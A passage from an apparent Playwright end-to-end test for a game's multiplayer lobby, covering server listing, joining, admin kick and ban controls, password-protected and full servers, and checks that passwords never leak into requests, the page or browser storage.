await wait(500)
await ada.page.click('#lobbies .refresh')
check(await listed(ada, ['Fern Hollow', 'Quiet Harbor']), `a server that stops is gone from the list at the next refresh (${(await rows(ada)).join(' | ')})`)
// The way to host one.
await ada.page.click('#lobbies .k-host')
const hosting = await ada.page.evaluate(() => ({ text: document.querySelector('#lobbies section[data-view=host]').textContent, links: document.querySelectorAll('#lobbies section[data-view=host] a').length }))
check(/your own machine/.test(hosting.text) && /node server\.mjs/.test(hosting.text) && /Early/.test(hosting.text) && hosting.links === 0, `Host a server says it runs on your machine, gives the command, says it is early, and links nothing (${hosting.links} links)`)
await shot(ada, 'host')
await ada.page.click('#lobbies .k-back')
// A code nobody has, and a code of another release, said before any load.
await code(ada, 'zzzzzzzzzzzzzzzzzzzz')
await ada.page.click('#lobbies .by-code')
await ada.page.waitForFunction(() => /No server has that code/.test(document.querySelector('#lobbies .list-line').textContent), null, { timeout: 10_000 }).catch(() => {})
const unknown = await listLine(ada)
await code(ada, elsewhere.code)
await ada.page.click('#lobbies .by-code')
await ada.page.waitForFunction(() => /another version/.test(document.querySelector('#lobbies .list-line').textContent), null, { timeout: 10_000 }).catch(() => {})
const other = await listLine(ada)
check(/No server has that code/.test(unknown) && /another version of the city/.test(other), `an unknown code says so ("${unknown}"), and a code of another release says so ("${other}")`)
await shot(ada, 'refused-release')
await code(ada, '')

step('joining')
// ── Joining: Ada by the Join key, Bram by the keyboard alone ──
await ada.page.fill('#lobbies-name', 'Ada')
// (A join on one machine is over in a fraction of a second: for its picture, the master's answer is held three seconds.)
const slow = async (route) => { await wait(3000); await route.continue() }
await ada.context.route('**/lobbies/*/join', slow)
await joinRow(ada, 'Fern Hollow')
await ada.page.waitForSelector('#lobbies[open] .steps li[data-step="calling"][data-at="now"]', { timeout: 30_000 }).then(() => shot(ada, 'joining')).catch(() => {})
const adaIn = await inLobby(ada)
await ada.context.unroute('**/lobbies/*/join', slow)
check(adaIn, 'Ada picks Fern Hollow, presses Join, and is in it once the page has loaded again')
await up(ada)
await servers(bram)
await bram.page.waitForSelector(row('Fern Hollow'), { timeout: 15_000 })
await bram.page.click('#lobbies-name'); await bram.page.keyboard.type('Bram')
// From the name, Shift+Tab to the list; the arrows to Fern Hollow; Enter.
await bram.page.keyboard.press('Shift+Tab')
for (let i = 0; i < 4 && !(await bram.page.evaluate(() => document.activeElement?.querySelector?.('.nm')?.textContent === 'Fern Hollow')); i++) await bram.page.keyboard.press('ArrowDown')
await reloads(bram, () => bram.page.keyboard.press('Enter'))
const bramIn = await inLobby(bram)
check(bramIn, 'Bram, by the keyboard alone (Shift+Tab to the list, the arrows, Enter), is in Fern Hollow too')
await up(bram)
for (const p of [ada, bram]) {
  const where = await p.page.evaluate(() => ({ href: location.href, history: history.length, ticket: sessionStorage.getItem('village.join') }))
  check(!/lobby=|[0-9a-z]{20}/.test(where.href) && where.ticket === null, `${p.name}'s address names no lobby and the tab keeps no ticket once in (${where.href.replace(site.url, '')})`)
}
const tagText = await ada.page.evaluate(() => document.querySelector('#lobby-tag')?.textContent ?? '')
const tagAt = await corner(ada, '#lobby-tag'), keyGone = await ada.page.evaluate(() => !document.querySelector('#realm button.lobbies'))
check(/Visiting\s*Fern Hollow/.test(tagText) && tagAt.shown && !tagAt.hits.length && keyGone, `the tag says whose server this is ("${tagText}"), in place of the Servers key (${keyGone}), clear of every other control and of the body (${JSON.stringify(tagAt)})`)
await wait(5000)
const adaSees = await people(ada), bramSees = await people(bram)
check(adaSees.includes('Ada') && adaSees.includes('Bram') && bramSees.includes('Ada') && bramSees.includes('Bram'), `each is in the other's list of who is here (Ada sees ${adaSees.join(', ')}; Bram sees ${bramSees.join(', ')})`)
await shot(bram, 'here')
await close(ada)
await shot(ada, 'tag')

step('admin')
// ── A stranger has no admin control ──
const strangerAdmin = await bram.page.evaluate(() => ({ built: document.querySelectorAll('#lobbies section[data-view=admin] *').length, kick: [...document.querySelectorAll('button')].filter((b) => /^(Kick|Ban|Lift)/.test(b.textContent.trim())).length }))
check(strangerAdmin.built === 0 && strangerAdmin.kick === 0, `a stranger's page holds no admin control (${JSON.stringify(strangerAdmin)})`)
// Before building is the admins': Bram's blast is the world's.
const before = size(fern.file)
await blast(bram)
const afterOpen = size(fern.file)
check(afterOpen > before, `Bram's blast, by the hand's click, goes into the world while everyone builds (${before} to ${afterOpen} bytes)`)

// ── Ada becomes an admin ──
await ada.page.click('#lobby-tag')
await ada.page.click('#lobbies .k-admin')
await ada.page.fill('#lobbies-admin', 'not-the-one')
await ada.page.click('#lobbies .am-go')
await ada.page.waitForFunction(() => /not the admin password/.test(document.querySelector('#lobbies .am-done').textContent), null, { timeout: 15_000 }).catch(() => {})
const wrongAdmin = await ada.page.evaluate(() => ({ said: document.querySelector('#lobbies .am-done').textContent, built: document.querySelectorAll('#lobbies section[data-view=admin] *').length, value: document.querySelector('#lobbies-admin').value }))
check(/not the admin password/.test(wrongAdmin.said) && wrongAdmin.built === 0 && wrongAdmin.value === '', `a wrong admin password is refused with its line, builds nothing, and leaves no password in the field (${JSON.stringify(wrongAdmin)})`)
await shot(ada, 'admin-wrong')
await wait(3000)
await ada.page.fill('#lobbies-admin', ADMIN)
await ada.page.click('#lobbies .am-go')
const adminUp = await ada.page.waitForFunction(() => document.querySelectorAll('#lobbies .players li').length >= 2, null, { timeout: 15_000 }).then(() => true, () => false)
check(adminUp, `the right one shows the admin's controls, with the players (${await ada.page.evaluate(() => [...document.querySelectorAll('#lobbies .players li')].map((li) => li.textContent).join(' | '))})`)
await shot(ada, 'admin')
// Building for admins only: Bram's blast changes nothing.
await ada.page.click('#lobbies label:has(input[name=lobbies-build][value=admins])')
await ada.page.waitForFunction(() => /Only admins build/.test(document.querySelector('#lobbies .d-build').textContent), null, { timeout: 10_000 }).catch(() => {})
const beforeShut = size(fern.file)
await blast(bram)
await wait(1000)
const afterShut = size(fern.file)
check(afterShut === beforeShut, `with building for admins only, Bram's blast changes nothing in the world (${beforeShut} then ${afterShut} bytes)`)
// Said as the server.
await ada.page.fill('#lobbies-say', 'Supper at the long table in five minutes')
await ada.page.click('#lobbies .say-go')
const heard = await bram.page.waitForFunction(() => /Supper at the long table/.test(document.querySelector('#lobbies .told')?.textContent ?? ''), null, { timeout: 15_000 }).then(() => true, () => false)
check(heard, 'Ada says something as the server, and Bram\'s page has it in what the server says')
await bram.page.click('#lobby-tag')
await shot(bram, 'here-told')
await close(bram)
// Kicked.
await ada.page.click('#lobbies .players li:has-text("Bram") button:has-text("Kick")')
const kicked = await bram.page.waitForFunction(() => /kicked/.test(document.querySelector('#lobbies .out-line')?.textContent ?? '') && document.querySelector('#lobbies')?.open, null, { timeout: 30_000 }).then(() => true, () => false)
await wait(1500)
const adaAfterKick = await ada.page.evaluate(() => [...document.querySelectorAll('#lobbies .players li')].map((li) => li.textContent).join(' | '))
check(kicked && !/Bram/.test(adaAfterKick), `Ada kicks Bram: Bram's page says so (${await bram.page.evaluate(() => document.querySelector('#lobbies .out-line').textContent)}), and he is gone from her list (${adaAfterKick})`)
const banner = await bram.page.evaluate(() => { const n = document.getElementById('door-notice'); return n && !n.hidden ? n.textContent : null })
check(banner === null, `joined from the list, the door's own banner is not left over the room's words (${banner})`)
await shot(bram, 'out-kicked')
await reloads(bram, () => bram.page.click('#lobbies .k-home'))
await up(bram)
check(await bram.page.evaluate(() => globalThis.engine.lobby === undefined && !document.querySelector('#lobby-tag')), 'Back to your world: Bram is in his own world again')
// Banned, refused, lifted.
await servers(bram)
await bram.page.waitForSelector(row('Fern Hollow'), { timeout: 15_000 })
await joinRow(bram, 'Fern Hollow')
await inLobby(bram)
await up(bram)
await ada.page.click('#lobbies .k-back'); await ada.page.click('#lobbies .k-admin')
await ada.page.waitForSelector('#lobbies .players li:has-text("Bram") button:has-text("Ban")', { timeout: 15_000 })
await ada.page.click('#lobbies .players li:has-text("Bram") button:has-text("Ban")')
const bannedOut = await bram.page.waitForFunction(() => /banned/.test(document.querySelector('#lobbies .out-line')?.textContent ?? ''), null, { timeout: 30_000 }).then(() => true, () => false)
await ada.page.waitForFunction(() => /Bram/.test(document.querySelector('#lobbies .bans')?.textContent ?? ''), null, { timeout: 10_000 }).catch(() => {})
check(bannedOut && /Bram/.test(await ada.page.evaluate(() => document.querySelector('#lobbies .bans').textContent)), 'Ada bans Bram: he is out, and in her list of the banned')
await reloads(bram, () => bram.page.click('#lobbies .k-home'))
await up(bram)
await servers(bram)
await bram.page.waitForSelector(row('Fern Hollow'), { timeout: 15_000 })
await joinRow(bram, 'Fern Hollow')
const refusedBan = await bram.page.waitForFunction(() => /banned/.test(document.querySelector('#lobbies .join-line')?.textContent ?? ''), null, { timeout: 60_000 }).then(() => true, () => false)
check(refusedBan, `coming back, Bram is refused: "${await bram.page.evaluate(() => document.querySelector('#lobbies .join-line')?.textContent)} ${await bram.page.evaluate(() => document.querySelector('#lobbies .join-next')?.textContent)}"`)
await shot(bram, 'refused-banned')
await ada.page.click('#lobbies .bans li:has-text("Bram") button:has-text("Lift")')
check(await ada.page.waitForFunction(() => /Nobody is banned/.test(document.querySelector('#lobbies .bans')?.textContent ?? ''), null, { timeout: 10_000 }).then(() => true, () => false), `Ada lifts the ban (${await ada.page.evaluate(() => document.querySelector('#lobbies .d-bans').textContent)})`)
await up(bram)

step('the password server')
// ── The password server: wrong, then right; then full for another ──
await bram.page.click('#lobbies .k-again')
await bram.page.waitForSelector(row('Quiet Harbor'), { timeout: 15_000 })
await joinRow(bram, 'Quiet Harbor')
await bram.page.waitForSelector('#lobbies .pw:not([hidden])', { timeout: 60_000 })
await shot(bram, 'password')
await bram.page.fill('#lobbies-pw', 'kettle-moss-71')
await bram.page.click('#lobbies .k-join')
const wrongLine = await bram.page.waitForFunction(() => { const l = document.querySelector('#lobbies .join-line')?.textContent ?? ''; return /wrong|Too many/.test(l) && !document.querySelector('#lobbies .pw').hidden ? l : null }, null, { timeout: 60_000 }).then((h) => h.jsonValue(), () => '')
check(/That password was wrong|Too many wrong/.test(wrongLine), `a wrong password is refused with its line, and asked again ("${wrongLine}")`)
await shot(bram, 'password-wrong')
await bram.page.waitForFunction(() => !document.querySelector('#lobbies .k-join').disabled, null, { timeout: 40_000 })
await wait(2500)
await bram.page.fill('#lobbies-pw', PASSWORD)
await bram.page.click('#lobbies .k-join')
let harborIn = await inLobby(bram, 60_000)
if (!harborIn && await bram.page.evaluate(() => !document.querySelector('#lobbies .pw').hidden)) { await wait(3000); await bram.page.fill('#lobbies-pw', PASSWORD); await bram.page.click('#lobbies .k-join'); harborIn = await inLobby(bram, 60_000) }
check(harborIn && /Quiet Harbor/.test(await bram.page.evaluate(() => globalThis.engine.lobby.server.name)), 'the right password takes Bram into Quiet Harbor')
await up(bram)
// Full: Ada, from inside Fern Hollow, tries Quiet Harbor (one at most).
await ada.page.click('#lobbies .k-back'); await ada.page.click('#lobbies .k-list')
await ada.page.waitForFunction(() => document.querySelector('#lobbies tbody tr.full .nm')?.textContent === 'Quiet Harbor', null, { timeout: 30_000 }).catch(() => {})
await ada.page.click(row('Quiet Harbor'))
await ada.page.waitForFunction(() => /full/.test(document.querySelector('#lobbies .list-line').textContent), null, { timeout: 10_000 }).catch(() => {})
const full = await listLine(ada), fullRow = await ada.page.evaluate(() => ({ word: document.querySelector('#lobbies tbody tr.full .full-word')?.textContent, join: document.querySelector('#lobbies .k-join').disabled }))
check(/Quiet Harbor is full/.test(full) && fullRow.word === 'Full' && fullRow.join && (await ada.page.evaluate(() => globalThis.engine.lobby?.server.name)) === 'Fern Hollow', `a full server says so on its row and when picked, Join stays off, and Ada stays where she is ("${full}", ${JSON.stringify(fullRow)})`)
await shot(ada, 'refused-full')

step('the private one')
// ── The private one, by its code; then home ──
await bram.page.click('#lobby-tag')
await reloads(bram, () => bram.page.click('#lobbies .k-leave'))
await up(bram)
check(await bram.page.evaluate(() => globalThis.engine.lobby === undefined), 'Leave server: Bram is in his own world')
await servers(bram)
await code(bram, back.code.toUpperCase())
await reloads(bram, () => bram.page.click('#lobbies .by-code'))
const backIn = await inLobby(bram)
const backAddr = await bram.page.evaluate(() => location.href + ' ' + (sessionStorage.getItem('village.join') ?? ''))
check(backIn && (await bram.page.evaluate(() => globalThis.engine.lobby.server.name)) === 'Back Room' && !backAddr.toLowerCase().includes(back.code), `the private server is joined by its code, which is in neither the address nor this tab's storage once in (${backAddr.replace(site.url, '')})`)
await up(bram)
await bram.page.click('#lobby-tag')
await reloads(bram, () => bram.page.click('#lobbies .k-leave'))
await up(bram)
await close(ada)
await ada.page.click('#lobby-tag')
await reloads(ada, () => ada.page.click('#lobbies .k-leave'))
await up(ada)

step('the master stopped')
// ── The master stopped: the list says so, and the page plays on ──
await harbor.stop()
await servers(ada)
check(await listed(ada, ['Fern Hollow']), `a server that stops (Quiet Harbor) is gone from the list (${(await rows(ada)).join(' | ')})`)
master.kill('SIGKILL')
await wait(500)
await ada.page.click('#lobbies .refresh')
await ada.page.waitForFunction(() => /not answering/.test(document.querySelector('#lobbies .list-line').textContent), null, { timeout: 20_000 }).catch(() => {})
const down = await listLine(ada)
await shot(ada, 'list-failing')
await close(ada)
await ada.page.keyboard.down('KeyW'); await wait(1200); await ada.page.keyboard.up('KeyW')
const plays = await ada.page.evaluate(() => ({ lobby: typeof globalThis.engine.lobby, ms: globalThis.engine.frameMs }))
check(/server list is not answering/.test(down) && plays.lobby === 'undefined' && plays.ms > 0, `the master stopped: the list says so ("${down}"), and the page plays on (a frame in ${plays.ms?.toFixed?.(1)} ms)`)

// ── The secrets ──
for (const [what, secret] of [['the server\'s password', PASSWORD], ['the admin password', ADMIN]]) {
  const inRequests = requests.filter((r) => r.url.includes(secret) || r.body.includes(secret)).map((r) => r.url)
  const inConsole = consoled.filter((t) => t.includes(secret)).length + errors.filter((t) => t.includes(secret)).length
  const inPages = []
  for (const p of [ada, bram]) {
    const found = await p.page.evaluate((secret) => {
      const where = []
      if (location.href.includes(secret)) where.push('address')
      if (document.documentElement.outerHTML.includes(secret)) where.push('DOM')
      if ([...document.querySelectorAll('input, textarea')].some((i) => i.value.includes(secret))) where.push('a field')
      for (const s of [localStorage, sessionStorage]) for (let i = 0; i < s.length; i++) { const k = s.key(i); if (k.includes(secret) || (s.getItem(k) ?? '').includes(secret)) where.push('storage') }
      return where
    }, secret)
    if (found.length) inPages.push(`${p.name}: ${found.join(', ')}`)
  }
  check(!inRequests.length && !inConsole && !inPages.length, `${what} is in no request (${inRequests.length}), console line or error (${inConsole}), address, DOM, field or storage (${inPages.join('; ') || 'none'})`)
}
check(!dialogs.length && agreements.length > 0 && agreements.every((t) => t.startsWith('Sly: ') || t.includes(`names a server list at ${new URL(MASTER).host}.`)), `the only browser dialog is the question before a list the address named, and it names the master (${agreements.length} asked; others: ${dialogs.join('; ') || 'none'})`)
check(!errors.length, `no page raised an error (${errors.join('; ').slice(0, 400) || 'none'})`)
console.log(`  pictures in ${shots}`)
console.log(failures.length ? `\n${failures.length} failed` : '\nall passed')
finish(failures.length ? 1 : 0)
